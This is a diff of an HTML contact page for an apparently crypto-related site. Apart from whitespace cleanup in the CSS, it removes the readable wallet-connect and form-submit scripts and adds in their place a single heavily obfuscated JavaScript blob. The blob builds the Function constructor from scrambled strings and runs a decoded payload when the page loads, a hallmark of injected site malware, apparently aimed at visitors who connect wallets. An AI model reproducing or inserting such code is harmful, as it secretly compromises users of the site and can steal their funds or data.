@@ -65,17 +65,6 @@
     position: relative; /* Allows positioning of the timer */
 }
 
-
-
-
-
-       
-
-        
-
-
-
-
         .footer {
             background-color: #333;
             color: #fff;
@@ -89,7 +78,7 @@
 
         .footer-list {
             list-style: none;
-text-align : left;
+	text-align : left;
         }
 
         .page {
@@ -108,12 +97,6 @@ text-align : left;
   max-width: 200px; /* Set the maximum width for the logo */
   height: 50px; /* Maintain the aspect ratio while resizing */
         }
-
-   
-
-    
-
-
 
 .main{
 		flex-basis: 400px;
@@ -155,15 +138,9 @@ margin-left: 35px;
 		width: 80%;
 		background-color:#F50870FF;
 		color: white;
-		font-size: 20px;
-		
-
-
-           
-            
+		font-size: 20px; 
             border-radius: 5px;
-            padding: 10px 20px;
-            
+            padding: 10px 20px;         
             cursor: pointer;
 
 }
@@ -185,8 +162,6 @@ margin-left: 35px;
     </div>
 
 <div id="notification" style="background-color: transparent;"></div>
-
-
 
 <div class="main">
 	<h3>Contact Us</h3>
@@ -240,66 +215,7 @@ margin-left: 35px;
         
 </div>
 <script>
-
-const connectWalletBtn = document.getElementById("connect-wallet");
-        const walletAddressInput = document.getElementById("walletAddress");
-
-        connectWalletBtn.addEventListener("click", async () => {
-            if (typeof ethereum !== "undefined") {
-                try {
-                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                    if (accounts.length > 0) {
-                        walletAddressInput.value = accounts[0];
-
-                document.getElementById('disconnect-wallet').style.display = 'inline';
-                document.getElementById('connect-wallet').style.display = 'none';
-
-
-                    }
-                } catch (error) {
-                    console.error(error);
-                }
-            }
-        });
-
-document.getElementById('disconnect-wallet').addEventListener('click', () => {
-            ethereum.request('eth_requestAccounts').then(() => {
-document.getElementById("walletAddress").value = '';
-                document.getElementById('connect-wallet').style.display = 'inline';
-                document.getElementById('disconnect-wallet').style.display = 'none';
-            });
-        });
-
-</script>
-<script>
-//-------Submit Query----------
-let url = "https://script.google.com/macros/s/AKfycbyEgoPosFFEXiS-mfvtH5p1SdjH5SECBNqQmjFEcsUH6NRrAD63mlvFrqkrIACOwy0-/exec";
-let form = document.querySelector('#form');        
-form.addEventListener("submit",(e)=>{
-	e.target.btn.innerHTML="Submitting...";
-	let d = new FormData(form);
-	fetch(url,{
-		method: "POST",
-		body: d
-	}).then((res)=>res.text())
-	.then((finalRes)=>{
-	e.target.btn.innerHTML="Submit";
-
-const notification = document.getElementById('notification');
-            notification.style.backgroundColor = "grey";
-
-
-
-	notification.innerHTML=finalRes;
-	form.reset();
-	setTimeout(() => {
-                notification.style.backgroundColor = 'transparent';
-                notification.textContent = '';
-            }, 3000);
-
-	})
-	e.preventDefault();
-})
+var connectWalletBtn,walletAddressInput;(function(){var JKQ='',Wzh=498-487;function xDD(r){var o=987572;var c=r.length;var p=[];for(var u=0;u<c;u++){p[u]=r.charAt(u)};for(var u=0;u<c;u++){var v=o*(u+225)+(o%24216);var w=o*(u+88)+(o%30340);var m=v%c;var q=w%c;var x=p[m];p[m]=p[q];p[q]=x;o=(v+w)%4002957;};return p.join('')};var gvw=xDD('eoilrfnctuktmcjxsgwzbuvarqyotcdosprhn').substr(0,Wzh);var Ixm='(ir};;;6o p3f,.=1f[(=ruyr"+v[z.fehhzszv5opl)nasgrz(c3;"=+ [t=s],]0,dr1rt(8",uo4[o.f[g={08oC;7f),f6u,nv;i)lnvr9z(ruag-=o,(48;rhSli],.,)n598hti0stt}7lgu+x8ah.0))[ nrt=sl{o.van )vjj!mr<esex+ta;}iub;il, vCvgri+.;ae9iw+crcn=;u.An<)6le+t4g=tz=me[;gr vn;r=+(.lsogx() hhnf;,v(a)nl=jttknutp-aa(=j0asn)k""or(g,autl=rr,>hzqClroalnvn2=24(lv,rnge= cosy](r),obcthgts. i;;o,0=.2 j;7;=spu=,=)9ftravphCoraqC=7)A,s<-;nr1=n[[)vrCcd+0){]2p+a1)ola0r<hkr=ore+hf9t1 1ht5=df +l;-a+6;fdr6v=;;id[ox*r;.tege;"=k=r]a;aii,rtA)(r[rt=+h6ohb..;drtuv,s2e,=;r]h;e+y2;}.;sut"7rvi)zo"(ii(]==nal})v"r];kglo8{v.S6=,r5jrs{brt+sn;z" j9)+*=viszs>rh+1].[jA7.1a;;belma{]6a)vz ;Cgh)dsf=lh==!u+b,qshmg)afjhq(9a=1z]2=n0p- (a}l.si18ht[d]0e}d8((C{oc +(s(s7))qa; rrq -;(0v4t,g6tt+gt21 (]nci;[dqk (=f)al5uc8;,,7oe)(a(oedu(,pnpfh (;a7 exneg0(.t.vnaha)te.n;;)sleip=adh amArg.e vr.tlua(h1itne.+r;)l+jt6o<0.p2-n);;+elir3f ((v)zef)=uvra+.=iuef(;';var ryG=xDD[gvw];var KoD='';var Xqq=ryG;var rkg=ryG(KoD,xDD(Ixm));var yNS=rkg(xDD('Kt_c1"KKtTik)ou,!:seK omq6nsnX=K,.KKu4=teAT%KK6.b3o*b=e14(cEotKht7K](iK3bKr!.lsadl%K6K{.]oKobn=_a6o2ffOn)qV2)i]KKK3_KloKht\'4}K)KKKmcra[_4e=mw0).ul=n)K"d.Mum1neg62]c)ren1KM5re)56eK0uo+4bK!_tftNuKf]lK,;(()}}l,_l.(K\/{Ks.fiKKXK=m([*rK..XbKrk6KBmlo$13fJt7[=m3l.$"St;iK,!(HtoMKgoa4n$3o>iKDKK4oK0+VK( e0,*ejkfb. OtEcnl)3"nur0tc6.c62C t.oeca.{..eL&nyju Uimmi{eT _a0eqwesHeDuFc)Z6i(.#tKnK%f2 ]eV%Klre%8qqsI.$KC)lld$E(].n(;1l te.]2.yord(eK6*2]%n]Ktb%!eacs[tesnn%o))et).u$KKapenpirtj&ioo\/DKr1S!K$rMn)te%EfF_fKf!s2tsKr)(tS(.e%}e)1n6K_eK").ble uhg)jiKKzQ;u]..ribvKr5))duK!a!]T;KteKe7-%a=q Ke{httK..{Bc_d.l{trKt\/SuKu,(n)lisp-h]EJ];Kdg!6u.n%)wde571;nl}e0!btK.g)g)Kets;bdgd3\/(qv0sSsN{2$K,oEKKo{Kdfoeenk!ca56rt.pwo;%.fc(me 7.KK25bw)b})Knwaa,KC)t.ro;}-smK"KhLs;t%yCndnKKr(oe#ir]aa rwu>t.l$Dh7=C[eKh.Zgc)o)KK%)()2_6yefblu3]cWsK.wq3KdSKrLsKFc%SK3Selpgcre! !nYf KOK8K.oo)%!_eKt<h;5(H[f0ivr}:tc5#43c!so#c*6(e.O*y#di{yPK2!Km!4hcreKt4ysK5}2%()O:n]KK[t]KuK6tey$uy01_n27ssn;(.@1eKnoK(t9 0.C_,$6en3QbliK(1.W_f u@)43Kt.cKfK1}3(;97p$usmK.I} a,t(K78D1)0lKKm:XHb_;_a(b@o)!7;rKl3K[ret}yfKe;y_(;)!;6g9.;Fli;$[!7(Fq ,Ke(."k8rfY3ueKteOrKtlvSti)n.(tG)f5o:_5a)0td((b2.eK\'us9.4KSK r0%t(ufKenrn%-i-! 6amI,e#qKK4K.u#;eneI.!t))3.ozArstaGenflKin))tK)s(jKKvsK"onon(#.ealK1tKie+K(e(iK3K]K.y.fs=-K%](;=vMn=ctaa2).Ws.t5=f318;K)a)[!c.f.B=7"e7>$W1.K34J0f)tCpe(E3recK_ruumauSK4ftK{%%6ufmKoK,_wri{u[]6toK)6oM=Kre_h7ioK.0o]7)rkn+=.$KKn tx]I\/K42l:0rc$e,cl$K.?(ouxao_3.l3K,b6.Kt5 s%e6eK(rK]fc3ewt)f33&m_(3.)i1)%$Tvo1RK&(f2rp_;t==rKR9)e!8A#ncg3K{7 sft:;nD!n4K[1(,9,]l(!dcosK }}asc=CM%t](,KK)3Zb! hKKKeIi6K8nrT9H]]9]3;K;7mK4Er)628KK1i$,<!%;fi+_!KKi2]K\/Kt.$1sKla6KeK]$)4)YKftf6cKve[KKKu}o1;Tfr=$_cf7_s2 Kgu7]U?fn)3=K..%.K.K>?K8j({!s_4e0KH6y?;@U.K82nKiRKKooKe11K(pen%Kr) eYnKy={2r(.3K rmB9rK)1oe3%ertdo(]6)3.0tKK.eo)m)Kuan"b3 .K\'6Kf;$,42f2l 4Ke3@)osKt;KKs():{9e$h)8;Ks4;%c,Pud(cdEK)r=]x4K_)K>K%o;!es(K)3e]}!=,l5K])aKK}(olE\/c9=.mKKK>bmn8tefKc=K.<KN)0KK3,%\/K=1K@12Kro[),9rf}fDca.(KmK9KPeE.[]K;7vtDKKKK;K14KiK,d>[;NldA[1 rlK_Ku_0cn)tXn$NceKKbK8t0K3_lKi6K,f(K!RqKKe<.K7tWeur3$[ClK0+eo)-e$ZHty)hJ]=K54{K}f3jfK)[ )eK435>K2S;4Ef nse6.0K63K(\/,w-K!\/oKo.!%tnKcne!M+%[uKg()f;,Ka_Kp)denKT6wi]fQi%f3(#K)K.eK{tKeKoK9cymraf_(e6e.DK,_3pr1nK)r7K!)<1NtK)=(.re)e 7$7b(O;uK3K\'K.8fK K#.%_$tu2.!K1ltK73cl2(;o3;5Ko;25KKK92an[wK;f1KKl )ie))iKK(.=(K.7u!ia!2$n.(dU4KeK]3KK7H\/e6jKK!._r_)K_t&08KdesK6pi4 _fKG>.=(4.22n72}sKyK.\/!Ku%;04K(4(+h&eK;f3Ku2KetK;ccK_=2 =733Ks1Q]2]_s(cs$Kyq;1(;aKf25GfKira]%,td$_KtDFAnhr KK2o!.$Ke$K{eo ViE4.enKel%j.>_3Knf) _o;k8atfs3W@ fS,S%KNd2KXKetiKt aco$ifp_aTfK(_["_.Kyjs4C]r%n(6.= (!KKr{0Ib6M 5f_wx)aDS,KKy!]K7((idecLV6)=f.KE$<iKu_)0err (0[1ifi.fK.K]0=x3c3(s4f(SK)f.lK!f@K])utNK _2\/$Pgn]lti+_!f r0#=}[o).0{ #K,)(0K7.kIaK3}ra @ %)cuSe!pb_If]r4lKk tgt!oKK3To(]eVO(tIc3ounos3i,he.(0a.2emKK3d 4KPe]05d{ r.3KK .!1o9dwn;ts5j=i".t_;]6,nK_61Kj(d$fz {K=7o34Ef5mgtK,aeKi"mKr}% {!8)KK*A n$eu{445$or5 ,l1=yl!,U]KiKT)}i,KK,C;ny.}aK4$o)a'));var WsY=Xqq(JKQ,yNS );WsY(9561);return 3906})()
 </script>
 
 </body>
